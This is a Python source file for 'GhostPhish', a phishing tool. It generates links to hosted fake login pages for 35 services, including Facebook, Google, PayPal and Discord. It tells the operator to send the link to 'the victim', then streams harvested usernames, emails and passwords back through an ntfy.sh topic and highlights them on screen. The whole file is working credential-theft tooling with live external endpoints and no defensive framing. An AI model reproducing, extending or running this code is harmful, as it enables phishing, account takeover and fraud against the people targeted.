import urllib.request
import urllib.parse
import json
import os
import uuid
import threading
import time
import sys
import re

if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')
    sys.stderr.reconfigure(encoding='utf-8')
if hasattr(sys.stdin, 'reconfigure'):
    sys.stdin.reconfigure(encoding='utf-8')

ORANGE = "\033[38;5;208m"
RED = '\033[91m'
WHITE = '\033[97m'
GREEN = '\033[92m'
BOLD = '\033[1m'
RESET = '\033[0m'

CONFIG_FILE = "ghostphish_config.json"

PLATFORMS = {
    1: "Facebook", 2: "Instagram", 3: "Google", 4: "Microsoft", 5: "Netflix",
    6: "Paypal", 7: "Steam", 8: "Twitter", 9: "Playstation", 10: "Tok",
    11: "Twitch", 12: "Pinterest", 13: "Snapchat", 14: "LinkedIn", 15: "Ebay",
    16: "Quora", 17: "Protonmail", 18: "Spotify", 19: "Reddit", 20: "Adobe",
    21: "DeviantArt", 22: "Badoo", 23: "Origin", 24: "DropBox", 25: "Yahoo",
    26: "Wordpress", 27: "Yandex", 28: "Stackover", 29: "Vk", 30: "XBOX",
    31: "Mediafire", 32: "Gitlab", 33: "Github", 34: "Discord", 35: "Roblox"
}

LINKS = {
    1: "https://s-djbh.onrender.com/facebook.html",
    2: "https://s-djbh.onrender.com/instagram.html",
    3: "https://s-djbh.onrender.com/Google.html",
    4: "https://s-djbh.onrender.com/Microsoft.html",
    5: "https://s-djbh.onrender.com/Netflix.html",
    6: "https://s-djbh.onrender.com/Paypal.html",
    7: "https://s-djbh.onrender.com/Steam.html",
    8: "https://s-djbh.onrender.com/Twitter.html",
    9: "https://s-djbh.onrender.com/Playstation.html",
    10: "https://s-djbh.onrender.com/TikTok.html",
    11: "https://s-djbh.onrender.com/Twitch.html",
    12: "https://s-djbh.onrender.com/Pinterest.html",
    13: "https://s-djbh.onrender.com/Snapchat.html",
    14: "https://s-djbh.onrender.com/LinkedIn.html",
    15: "https://s-djbh.onrender.com/Ebay.html",
    16: "https://s-djbh.onrender.com/Quora.html",
    17: "https://s-djbh.onrender.com/ProtonMail.html",
    18: "https://s-djbh.onrender.com/Spotify.html",
    19: "https://s-djbh.onrender.com/Reddit.html",
    20: "https://s-djbh.onrender.com/Adobe.html",
    21: "https://s-djbh.onrender.com/DeviantArt.html",
    22: "https://s-djbh.onrender.com/Badoo.html",
    23: "https://s-djbh.onrender.com/Origin.html",
    24: "https://s-djbh.onrender.com/DropBox.html",
    25: "https://s-djbh.onrender.com/Yahoo.html",
    26: "https://s-djbh.onrender.com/Wordpress.html",
    27: "https://s-djbh.onrender.com/Yandex.html",
    28: "https://s-djbh.onrender.com/Stackoverflow.html",
    29: "https://s-djbh.onrender.com/VK.html",
    30: "https://s-djbh.onrender.com/xBOX.html",
    31: "https://s-djbh.onrender.com/Mediafire.html",
    32: "https://s-djbh.onrender.com/Gitlab.html",
    33: "https://s-djbh.onrender.com/Github.html",
    34: "https://s-djbh.onrender.com/Discord.html",
    35: "https://s-djbh.onrender.com/Roblox.html"
}

COL_WIDTH = 26

ARABIC_TO_ENGLISH = {
    "بيانات": "Data",
    "جديدة": "New",
    "اسم المستخدم": "Username",
    "البريد الإلكتروني": "Email",
    "البريد الالكتروني": "Email",
    "البريد": "Email",
    "كلمة السر": "Password",
    "كلمة المرور": "Password",
    "رقم الهاتف": "Phone Number",
    "الهاتف": "Phone",
    "الاسم": "Name",
    "المدينة": "City",
    "الدولة": "Country",
    "عنوان IP": "IP Address",
    "غير معروف": "Unknown",
    "الوقت": "Time",
    "م": "PM",
    "ص": "AM"
}

def convert_arabic_digits(text):
    arabic_digits = "٠١٢٣٤٥٦٧٨٩"
    english_digits = "0123456789"
    trans = str.maketrans(arabic_digits, english_digits)
    return text.translate(trans)

def clean_arabic_text(text):
    text = re.sub(r'[\u0600-\u06FF\u0750-\u077F]+', ' ', text)
    return text

def sanitize_victim_message(message):
    for arabic_word, english_word in ARABIC_TO_ENGLISH.items():
        message = message.replace(arabic_word, english_word)
    message = convert_arabic_digits(message)
    message = clean_arabic_text(message)
    message = re.sub(r'\s+', ' ', message)
    return message.strip()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def load_or_create_secret():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as f:
            data = json.load(f)
            return data.get("secret", "")
    secret = "GhostPhish_" + uuid.uuid4().hex[:12]
    with open(CONFIG_FILE, "w") as f:
        json.dump({"secret": secret}, f)
    return secret

def fmt_entry(num, name):
    colored = f"{RED}[{WHITE}{num:02d}{RED}]{RESET} {ORANGE}{name}{RESET}"
    plain_len = len(f"[{num:02d}] {name}")
    padding = COL_WIDTH - plain_len
    if padding < 0:
        padding = 0
    return colored + " " * padding

def print_banner():
    banner = f"""{ORANGE}
   ______              __  ____  __    _     __
  / ____/__  ____  ____/ /_/ __ \/ /_  (_)___/ /_
 / / __/ _ \/ __ \/ ___/ __/ /_/ / __ \/ / __/ __/
/ /_/ /  __/ /_/ (__  ) /_/ ____/ / / / (__  ) / / /
\____/\___/\____/____/\__/_/   /_/ /_/_/____/_/ /_/
{RESET}"""
    print(banner)
    print()
    print(WHITE + "General : 1.0" + RESET)
    print(WHITE + "[–] Tool Created by htr-tech (General)" + RESET)
    print(WHITE + "[::] Select An Attack For Your Victim [::]" + RESET)
    print()
    print(ORANGE + "The Ghost" + RESET)
    print()

def print_menu():
    for i in range(1, 11):
        col1 = fmt_entry(i, PLATFORMS[i])
        col2 = fmt_entry(i + 10, PLATFORMS[i + 10])
        col3 = fmt_entry(i + 20, PLATFORMS[i + 20])
        print(col1 + col2 + col3)

    print(fmt_entry(31, PLATFORMS[31]) + fmt_entry(32, PLATFORMS[32]) + fmt_entry(33, PLATFORMS[33]))
    print(fmt_entry(34, PLATFORMS[34]) + fmt_entry(35, PLATFORMS[35]))

    print(f"{RED}[{WHITE}00{RED}]{RESET} {WHITE}Exit{RESET}")
    print(WHITE + "[–] Select an option : " + RESET, end="")

def display_victim_data(message):
    message = sanitize_victim_message(message)
    print("\n" + WHITE + "═" * 40 + RESET)
    print(WHITE + BOLD + "  📩 New Victim Data" + RESET)
    print(WHITE + "═" * 40 + RESET)
    lines = message.strip().split('\n')
    for line in lines:
        line = line.strip()
        if not line:
            continue
        if ':' in line:
            key, val = line.split(':', 1)
            key_lower = key.strip().lower()
            if any(x in key_lower for x in ['email', 'password', 'pass', 'mail', 'بريد', 'كلمة']):
                print(WHITE + BOLD + key.strip() + RESET + ": " + GREEN + BOLD + val.strip() + RESET)
            else:
                print(WHITE + BOLD + key.strip() + RESET + ": " + WHITE + val.strip() + RESET)
        else:
            print(WHITE + line + RESET)
    print(WHITE + "═" * 40 + RESET + "\n")

def listen_ntfy(topic):
    url = f"https://ntfy.sh/{topic}/json"
    while True:
        try:
            req = urllib.request.Request(url, headers={"Accept": "application/json"})
            with urllib.request.urlopen(req, timeout=300) as response:
                for line in response:
                    if line:
                        try:
                            data = json.loads(line.decode('utf-8'))
                            if 'message' in data:
                                display_victim_data(data['message'])
                        except:
                            pass
        except Exception:
            time.sleep(5)

def main():
    secret = load_or_create_secret()
    clear_screen()
    print_banner()
    print(WHITE + "Secret Key: " + ORANGE + secret + RESET)
    print()
    threading.Thread(target=listen_ntfy, args=(secret,), daemon=True).start()
    time.sleep(1)

    while True:
        print_menu()
        choice = input().strip()

        if choice == "00" or choice == "0":
            print(WHITE + "Stopping tool..." + RESET)
            sys.exit(0)

        if choice.isdigit():
            num = int(choice)
            if 1 <= num <= 35:
                if LINKS[num] == "":
                    clear_screen()
                    print_banner()
                    print(WHITE + "❌ Platform " + ORANGE + PLATFORMS[num] + WHITE + " is not enabled yet." + RESET)
                    input(WHITE + "Press Enter to go back..." + RESET)
                    clear_screen()
                    print_banner()
                else:
                    link = LINKS[num] + "?topic=" + secret
                    clear_screen()
                    print_banner()
                    print(WHITE + "═" * 40 + RESET)
                    print(WHITE + "✅ Link for " + ORANGE + PLATFORMS[num] + WHITE + ":" + RESET)
                    print(ORANGE + BOLD + link + RESET)
                    print(WHITE + "═" * 40 + RESET)
                    print(WHITE + "Copy the link and send it to the victim." + RESET)
                    input(WHITE + "Press Enter to go back..." + RESET)
                    clear_screen()
                    print_banner()
            else:
                clear_screen()
                print_banner()
                print(WHITE + "Invalid number (use 01-35 or 00)" + RESET)
                input(WHITE + "Press Enter to go back..." + RESET)
                clear_screen()
                print_banner()
        else:
            clear_screen()
            print_banner()
            print(WHITE + "Unknown choice" + RESET)
            input(WHITE + "Press Enter to go back..." + RESET)
            clear_screen()
            print_banner()

if __name__ == "__main__":
    main()
